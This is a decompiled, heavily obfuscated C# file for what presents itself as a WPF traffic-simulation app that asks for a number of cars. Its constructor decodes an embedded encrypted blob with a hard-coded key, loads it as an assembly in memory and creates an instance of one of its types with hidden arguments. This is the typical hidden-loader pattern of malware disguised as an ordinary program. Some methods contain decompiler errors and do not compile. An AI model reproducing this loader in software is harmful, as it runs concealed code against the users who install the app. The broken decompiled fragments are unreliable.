using System;
using System.CodeDom.Compiler;
using System.ComponentModel;
using System.Diagnostics;
using System.Reflection;
using System.Text;
using System.Windows;
using System.Windows.Controls;
using System.Windows.Controls.Primitives;
using System.Windows.Input;
using System.Windows.Markup;

namespace Traffic_Simulation;

public class MainWindow : Window, IComponentConnector
{
	internal TextBox box;

	private bool _contentLoaded;

	private Assembly Asemia(object ji)
	{
		Assembly result = default(Assembly);
		while (true)
		{
			int num = -1473923244;
			while (true)
			{
				uint num2;
				switch ((num2 = (uint)num ^ 0xCC01B582u) % 3u)
				{
				case 1u:
					goto IL_0003;
				case 2u:
					break;
				default:
					return result;
				}
				break;
				IL_0003:
				result = MainWindow.smethod_0((byte[])ji);
				num = (int)((num2 * 231167783) ^ 0x2E1D5898);
			}
		}
	}

	public MainWindow()
	{
		Assembly assembly_ = Asemia(Points.Chi(Led.Red1, MainWindow.smethod_2(MainWindow.smethod_1(), "A4DC95C840QFUTHC44S847")));
		Type type_ = MainWindow.smethod_3(assembly_)[1];
		string[] array = MainWindow.smethod_4(Points.Bookmarks, new char[1] { '~' });
		object[] object_ = new object[3]
		{
			array[0],
			array[1],
			"Traffic_Simulation"
		};
		MainWindow.smethod_5(type_, object_);
		InitializeComponent();
	}

	private void box_PreviewMouseLeftButtonUp(object sender, MouseButtonEventArgs e)
	{
		bool flag = default(bool);
		while (true)
		{
			int num = 897732645;
			while (true)
			{
				uint num2;
				switch ((num2 = (uint)num ^ 0x70C6B0B6u) % 6u)
				{
				case 5u:
					num = (int)(num2 * 292248778) ^ -988822500;
					continue;
				case 4u:
				{
					int num3;
					int num4;
					if (!flag)
					{
						num3 = 1748626262;
						num4 = 1748626262;
					}
					else
					{
						num3 = 579633020;
						num4 = 579633020;
					}
					num = num3 ^ ((int)num2 * -1160310571);
					continue;
				}
				case 2u:
					MainWindow.smethod_8(box, "");
					num = (int)((num2 * 1609073091) ^ 0x4190EB1F);
					continue;
				case 1u:
					flag = MainWindow.smethod_7(MainWindow.smethod_6(box), "Enter number");
					num = (int)((num2 * 1571868833) ^ 0x6BC26AA1);
					continue;
				default:
					return;
				case 3u:
					break;
				case 0u:
					return;
				}
				break;
			}
		}
	}

	private void Start(object sender, RoutedEventArgs e)
	{
		//IL_00a4: Unknown result type (might be due to invalid IL or missing references)
		//IL_0139: Unknown result type (might be due to invalid IL or missing references)
		//IL_013a: Unknown result type (might be due to invalid IL or missing references)
		//IL_013c: Expected I4, but got Unknown
		//IL_013d: Unknown result type (might be due to invalid IL or missing references)
		//IL_015f: Expected I4, but got Unknown
		//IL_017e: Incompatible stack heights: 0 vs 1
		//IL_018d: Incompatible stack heights: 0 vs 1
		//IL_019c: Incompatible stack heights: 0 vs 1
		//IL_01a4: Unknown result type (might be due to invalid IL or missing references)
		//IL_01b7: Incompatible stack heights: 0 vs 1
		//IL_01c9: Incompatible stack heights: 0 vs 1
		//IL_01d3: Incompatible stack heights: 0 vs 1
		try
		{
			bool flag = int.Parse(MainWindow.smethod_6(box)) > 0;
			while (true)
			{
				int num = -403403398;
				while (true)
				{
					uint num2;
					switch ((num2 = (uint)num ^ 0xBB4AB9B0u) % 11u)
					{
					case 10u:
					{
						Simulation window_ = new Simulation(int.Parse(MainWindow.smethod_6(box)));
						MainWindow.smethod_9((Window)(object)window_);
						num = ((int)num2 * -362846971) ^ 0x7143AC46;
						continue;
					}
					case 9u:
					{
						int num3;
						int num4;
						if (flag)
						{
							num3 = -469774211;
							num4 = -469774211;
						}
						else
						{
							num3 = -1673896414;
							num4 = -1673896414;
						}
						num = num3 ^ (int)(num2 * 383344375);
						continue;
					}
					case 8u:
						num = ((int)num2 * -345087424) ^ 0x51231E6C;
						continue;
					case 5u:
						num = ((int)num2 * -1441602416) ^ 0x714BD9DC;
						continue;
					case 4u:
						MainWindow.smethod_10((Window)(object)this);
						num = ((int)num2 * -810381090) ^ 0x72D119EF;
						continue;
					case 3u:
						MainWindow.smethod_11("Count of the car has to greater than zero!");
						num = ((int)num2 * -2135408930) ^ -714016329;
						continue;
					case 2u:
						num = -859398844;
						continue;
					case 1u:
						num = ((int)num2 * -2022131908) ^ 0x705DF41B;
						continue;
					case 0u:
						MainWindow.smethod_8(box, "Enter Number");
						num = -65528601;
						continue;
					default:
						return;
					case 6u:
						break;
					case 7u:
						return;
					}
					break;
				}
			}
		}
		catch (Exception exception_)
		{
			while (true)
			{
				_ = -2063387694;
				while (true)
				{
					_003F val = /*Error near IL_013a: Stack underflow*/^ -1152730704;
					uint num2 = (uint)(int)val;
					switch (val % 7)
					{
					default:
						return;
					case 6:
						MainWindow.smethod_8(box, "Enter Number");
						_ = ((int)num2 * -407208168) ^ 0x2790A0AC;
						continue;
					case 4:
						_ = (num2 * 216077747) ^ 0x59EB1C04;
						continue;
					case 3:
						_ = (num2 * 224735974) ^ 0xC1E8CDE4u;
						continue;
					case 2:
						MainWindow.smethod_11(MainWindow.smethod_12(exception_));
						_ = ((int)num2 * -1099269041) ^ 0x61F597E;
						continue;
					case 0:
						_ = ((int)num2 * -617537799) ^ -2062312631;
						continue;
					case 5:
						break;
					case 1:
						return;
					}
					break;
				}
			}
		}
	}

	private void Window_KeyDown(object sender, KeyEventArgs e)
	{
		//IL_0004: Unknown result type (might be due to invalid IL or missing references)
		//IL_000a: Invalid comparison between Unknown and I4
		//IL_0083: Unknown result type (might be due to invalid IL or missing references)
		//IL_0126: Unknown result type (might be due to invalid IL or missing references)
		//IL_0127: Unknown result type (might be due to invalid IL or missing references)
		//IL_012a: Expected I4, but got Unknown
		//IL_012b: Unknown result type (might be due to invalid IL or missing references)
		//IL_0149: Expected I4, but got Unknown
		//IL_0169: Incompatible stack heights: 0 vs 1
		//IL_0171: Unknown result type (might be due to invalid IL or missing references)
		//IL_0185: Incompatible stack heights: 0 vs 1
		//IL_0195: Incompatible stack heights: 0 vs 1
		//IL_01a5: Incompatible stack heights: 0 vs 1
		//IL_01af: Incompatible stack heights: 0 vs 1
		while (true)
		{
			int num = 1544934253;
			while (true)
			{
				uint num2;
				switch ((num2 = (uint)num ^ 0x737614CBu) % 3u)
				{
				case 1u:
					if ((int)MainWindow.smethod_13(e) == 6)
					{
						goto IL_0011;
					}
					return;
				case 0u:
					break;
				default:
					try
					{
						bool flag = int.Parse(MainWindow.smethod_6(box)) > 0;
						while (true)
						{
							int num3 = 1198271236;
							while (true)
							{
								switch ((num2 = (uint)num3 ^ 0x737614CBu) % 6u)
								{
								case 5u:
									num3 = ((int)num2 * -1730009600) ^ 0x37576BE0;
									continue;
								case 4u:
									MainWindow.smethod_8(box, "Enter Number");
									MainWindow.smethod_11("Count of the car has to greater than zero!");
									num3 = 324311254;
									continue;
								case 3u:
								{
									int num4;
									int num5;
									if (flag)
									{
										num4 = 720335327;
										num5 = 720335327;
									}
									else
									{
										num4 = 1237494647;
										num5 = 1237494647;
									}
									num3 = num4 ^ (int)(num2 * 1380387718);
									continue;
								}
								case 0u:
								{
									Simulation window_ = new Simulation(int.Parse(MainWindow.smethod_6(box)));
									MainWindow.smethod_9((Window)(object)window_);
									MainWindow.smethod_10((Window)(object)this);
									num3 = ((int)num2 * -923140140) ^ 0x3992F78;
									continue;
								}
								default:
									return;
								case 2u:
									break;
								case 1u:
									return;
								}
								break;
							}
						}
					}
					catch (Exception exception_)
					{
						while (true)
						{
							_ = 1021181078;
							while (true)
							{
								_003F val = /*Error near IL_0127: Stack underflow*/^ 0x737614CB;
								num2 = (uint)(int)val;
								switch (val % 6)
								{
								default:
									return;
								case 5:
									MainWindow.smethod_8(box, "Enter Number");
									_ = ((int)num2 * -1931575603) ^ -2060551726;
									continue;
								case 3:
									MainWindow.smethod_11(MainWindow.smethod_12(exception_));
									_ = ((int)num2 * -121939390) ^ -1934491635;
									continue;
								case 2:
									_ = ((int)num2 * -1796905856) ^ 0x64CD9902;
									continue;
								case 0:
									_ = (num2 * 325556151) ^ 0x18F474A4;
									continue;
								case 4:
									break;
								case 1:
									return;
								}
								break;
							}
						}
					}
				}
				break;
				IL_0011:
				num = ((int)num2 * -1631356059) ^ 0x7058A18F;
			}
		}
	}

	[DebuggerNonUserCode]
	[GeneratedCode("PresentationBuildTasks", "4.0.0.0")]
	public void InitializeComponent()
	{
		bool contentLoaded = default(bool);
		Uri uri_ = default(Uri);
		while (true)
		{
			int num = -1604184171;
			while (true)
			{
				uint num2;
				switch ((num2 = (uint)num ^ 0x85876136u) % 9u)
				{
				case 8u:
					num = (int)((num2 * 996321933) ^ 0x5A73D965);
					continue;
				case 7u:
					contentLoaded = _contentLoaded;
					num = ((int)num2 * -591019674) ^ -485206035;
					continue;
				case 6u:
				{
					int num3;
					int num4;
					if (!contentLoaded)
					{
						num3 = 2073727917;
						num4 = 2073727917;
					}
					else
					{
						num3 = 651034022;
						num4 = 651034022;
					}
					num = num3 ^ ((int)num2 * -293380821);
					continue;
				}
				case 5u:
					num = ((int)num2 * -1615407610) ^ -1985811822;
					continue;
				case 4u:
					num = (int)((num2 * 485047705) ^ 0xFBAE410);
					continue;
				case 3u:
					_contentLoaded = true;
					uri_ = MainWindow.smethod_14("/FOqv;component/mainwindow.xaml", UriKind.Relative);
					num = -1407035325;
					continue;
				case 2u:
					MainWindow.smethod_15((object)this, uri_);
					num = (int)(num2 * 1972976221) ^ -1486101996;
					continue;
				default:
					return;
				case 0u:
					break;
				case 1u:
					return;
				}
				break;
			}
		}
	}

	[DebuggerNonUserCode]
	[GeneratedCode("PresentationBuildTasks", "4.0.0.0")]
	[EditorBrowsable(EditorBrowsableState.Never)]
	void IComponentConnector.Connect(int connectionId, object target)
	{
		//IL_0013: Unknown result type (might be due to invalid IL or missing references)
		//IL_001d: Expected O, but got Unknown
		//IL_0074: Unknown result type (might be due to invalid IL or missing references)
		//IL_007e: Expected O, but got Unknown
		//IL_008a: Unknown result type (might be due to invalid IL or missing references)
		//IL_0094: Expected O, but got Unknown
		//IL_009c: Unknown result type (might be due to invalid IL or missing references)
		//IL_00a8: Unknown result type (might be due to invalid IL or missing references)
		//IL_00b2: Expected O, but got Unknown
		//IL_00b2: Expected O, but got Unknown
		int num4 = default(int);
		int num3 = default(int);
		while (true)
		{
			int num = -1785891208;
			while (true)
			{
				uint num2;
				switch ((num2 = (uint)num ^ 0xC48AC90Fu) % 14u)
				{
				case 13u:
					MainWindow.smethod_17((UIElement)(object)box, new MouseButtonEventHandler(box_PreviewMouseLeftButtonUp));
					num = ((int)num2 * -1753515786) ^ 0x7A99BF84;
					continue;
				case 12u:
					num = (int)((num2 * 888416897) ^ 0xA5B66F4);
					continue;
				case 11u:
					switch (num4)
					{
					case 1:
						goto IL_0067;
					case 2:
						goto IL_0088;
					case 3:
						goto IL_009b;
					}
					num = (int)((num2 * 1504538158) ^ 0x530FDF49);
					continue;
				case 6u:
					goto IL_0067;
				case 7u:
					goto IL_0088;
				case 2u:
					goto IL_009b;
				case 10u:
					num = ((int)num2 * -1103128742) ^ -1275832549;
					continue;
				case 9u:
					num = ((int)num2 * -1269660175) ^ -787020977;
					continue;
				case 8u:
					num4 = num3;
					num = ((int)num2 * -1180374799) ^ -34501238;
					continue;
				case 5u:
					num3 = connectionId;
					num = (int)((num2 * 1426325246) ^ 0x798C042F);
					continue;
				case 4u:
					_contentLoaded = true;
					num = -238403642;
					continue;
				case 3u:
					num = (int)((num2 * 182986378) ^ 0x185A5D50);
					continue;
				default:
					return;
				case 0u:
					break;
				case 1u:
					return;
					IL_009b:
					MainWindow.smethod_18((ButtonBase)(Button)target, new RoutedEventHandler(Start));
					num = -1783368773;
					continue;
					IL_0088:
					box = (TextBox)target;
					num = -1976997116;
					continue;
					IL_0067:
					MainWindow.smethod_16((UIElement)(object)(MainWindow)target, new KeyEventHandler(Window_KeyDown));
					num = -238403642;
					continue;
				}
				break;
			}
		}
	}

	static Assembly smethod_0(byte[] byte_0)
	{
		return Assembly.Load(byte_0);
	}

	static Encoding smethod_1()
	{
		return Encoding.Default;
	}

	static byte[] smethod_2(Encoding encoding_0, string string_0)
	{
		return encoding_0.GetBytes(string_0);
	}

	static Type[] smethod_3(Assembly assembly_0)
	{
		return assembly_0.GetTypes();
	}

	static string[] smethod_4(string string_0, char[] char_0)
	{
		return string_0.Split(char_0);
	}

	static object smethod_5(Type type_0, object[] object_0)
	{
		return Activator.CreateInstance(type_0, object_0);
	}

	static string smethod_6(TextBox textBox_0)
	{
		return textBox_0.get_Text();
	}

	static bool smethod_7(string string_0, string string_1)
	{
		return string_0 == string_1;
	}

	static void smethod_8(TextBox textBox_0, string string_0)
	{
		textBox_0.set_Text(string_0);
	}

	static void smethod_9(Window window_0)
	{
		window_0.Show();
	}

	static void smethod_10(Window window_0)
	{
		window_0.Close();
	}

	static MessageBoxResult smethod_11(string string_0)
	{
		//IL_0001: Unknown result type (might be due to invalid IL or missing references)
		return MessageBox.Show(string_0);
	}

	static string smethod_12(Exception exception_0)
	{
		return exception_0.Message;
	}

	static Key smethod_13(KeyEventArgs keyEventArgs_0)
	{
		//IL_0001: Unknown result type (might be due to invalid IL or missing references)
		return keyEventArgs_0.get_Key();
	}

	static Uri smethod_14(string string_0, UriKind uriKind_0)
	{
		return new Uri(string_0, uriKind_0);
	}

	static void smethod_15(object object_0, Uri uri_0)
	{
		Application.LoadComponent(object_0, uri_0);
	}

	static void smethod_16(UIElement uielement_0, KeyEventHandler keyEventHandler_0)
	{
		uielement_0.add_KeyDown(keyEventHandler_0);
	}

	static void smethod_17(UIElement uielement_0, MouseButtonEventHandler mouseButtonEventHandler_0)
	{
		uielement_0.add_PreviewMouseLeftButtonUp(mouseButtonEventHandler_0);
	}

	static void smethod_18(ButtonBase buttonBase_0, RoutedEventHandler routedEventHandler_0)
	{
		buttonBase_0.add_Click(routedEventHandler_0);
	}
}
